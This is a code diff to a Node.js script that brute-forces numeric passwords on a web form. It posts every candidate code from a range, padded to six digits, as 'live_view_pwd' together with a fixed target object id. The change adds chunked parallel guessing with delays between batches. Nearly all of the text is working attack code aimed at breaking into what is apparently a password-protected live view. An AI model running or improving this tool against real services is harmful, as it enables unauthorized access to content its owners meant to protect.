@@ -1,5 +1,6 @@
 const formData = require('form-data');
 const fetch = require('node-fetch');
+const chunk = require('lodash/chunk');
 
 /**
  * wait for xxxx ms
@@ -11,9 +12,11 @@ const wait = (time) => new Promise((resolve) => {
 
 /**
  * try one password
- * @param {string} pwd 
+ * @param {string} pwd
+ * @param {object} options
+ * @param {string} options.id
  */
-const tryPwd = async (pwd, id = '5df9b47181171731bc5a51e5') => {
+const tryPwd = async (pwd, { id = '5df9b47181171731bc5a51e5' }) => {
   const fData = new formData();
   fData.append('live_view_pwd', pwd);
   fData.append('live_obj_id', id);
@@ -48,16 +51,33 @@ const tryPwd = async (pwd, id = '5df9b47181171731bc5a51e5') => {
   }
 };
 
+const tryAllPwdChunks = (pwdChunks, { id, waitfor }) => {
+  const failedChunks = [];
+
+  pwdChunks.forEach(async (pwdChunk) => {
+    await wait(waitfor);
+
+    const isSuccess = await Promise.all(
+      pwdChunk.map((pwd) => tryPwd(pwd, { id })),
+    );
+
+    !isSuccess && failedChunks.push(pwdChunk);
+  });
+
+  return failedChunks;
+};
+
 /**
  * Fill password with digits: xxx => 000xxx
- * @param {string} pwd password 
+ * @param {string|number} pwd password 
  * @param {number} totalDigits total digits of a password
  * @param {number} fillWith
  */
-const fillDigits = (pwd, totalDigits = 6, fillWith = 0, poisition = 'before') => {
+const fillDigits = (pwd = '', totalDigits = 6, fillWith = 0) => {
+  console.log(pwd);
   const digitsToFill = totalDigits - `${pwd}`.length;
   const placeholder = [ ...Array(digitsToFill) ].fill(fillWith).join('');
-  return poisition === 'before' ? `${placeholder}${pwd}` : `${pwd}${placeholder}`;
+  return `${placeholder}${pwd}`;
 };
 
 /**
@@ -65,47 +85,50 @@ const fillDigits = (pwd, totalDigits = 6, fillWith = 0, poisition = 'before') =>
  * @param {number} from
  * @param {number} to
  */
-const getAllPwds = (from = 0, to = 0) => {
+const getAllPwds = (from = 0, to = 0, validator = () => true) => {
   const result = [];
-
   for(let i = from; i < to + 1; i++) {
-    result.push(i);
+    validator(i) && result.push(i);
   }
   return result;
-}
-  // [ ...Array(limit) ].map((val, index) => `${index}`);
+};
 
 /**
- * fill all passwords 
- * @param {*} password 
+ * sort all paswwords and chunk with a given size
+ * @param {string} pwds 
+ * @param {number} size 
  */
-const fillAllPwds = (pwds) => pwds.map((pwd) => fillDigits(pwd));
+const sortChunkPwds = (pwds = [], size) => {
+  const sorted = pwds.sort((a, b) => a > b);
+  return size ? chunk(sorted, size) : sorted;
+};
 
 /**
  * start trying passwords
  * @param {object} argv
  * @param {number} argv.from
  * @param {number} argv.to
- * @param {string} mode options ["full", "original"]
+ * @param {string} mode options ["all"]
  */
-const start = async ({ from = 0, to = 0, id, waitfor = 10, mode }) => {
+const start = async ({ from = 0, to = 0, id, waitfor = 10, mode, chunksize = 10 }) => {
   const pwds = getAllPwds(from, to);
 
-  const pwdsFullDigits = fillAllPwds(pwds).sort((a, b) => a > b);
-  const allPwds = mode === 'all' ? [ ...pwds, pwdsFullDigits ] : pwdsFullDigits;
+  const pwdsChunks = sortChunkPwds(pwds, chunksize);
+  const pwdsFullDigitChunks = sortChunkPwds(
+    pwds.map((pwd) => fillDigits(pwd)),
+    chunksize,
+  );
 
-  console.log(`start from ${from} to ${to}`);
+  console.log('Start trying passwords with full digits');
+  const failedFullDigitChunks = tryAllPwdChunks(pwdsFullDigitChunks, { id, waitfor });
 
-  let failedOnce = true;
+  let failedPartialDigitsChunks = [];
+  if (mode === 'all') {
+    console.log('Start trying passwords with partial digits');
+    failedPartialDigitsChunks = tryAllPwdChunks(pwdsChunks, { id, waitfor });
+  }
 
-  allPwds.forEach(async (code) => {
-    if (failedOnce) {
-      console.log(code);
-    }
-
-    await wait(waitfor);
-    await tryPwd(code, id);
-  });
+  console.log(JSON.stringify([...failedFullDigitChunks, ...failedPartialDigitsChunks]));
 };
 
 module.exports = {
@@ -113,6 +136,6 @@ module.exports = {
   tryPwd,
   fillDigits,
   getAllPwds,
-  fillAllPwds,
+  sortChunkPwds,
   start,
 };
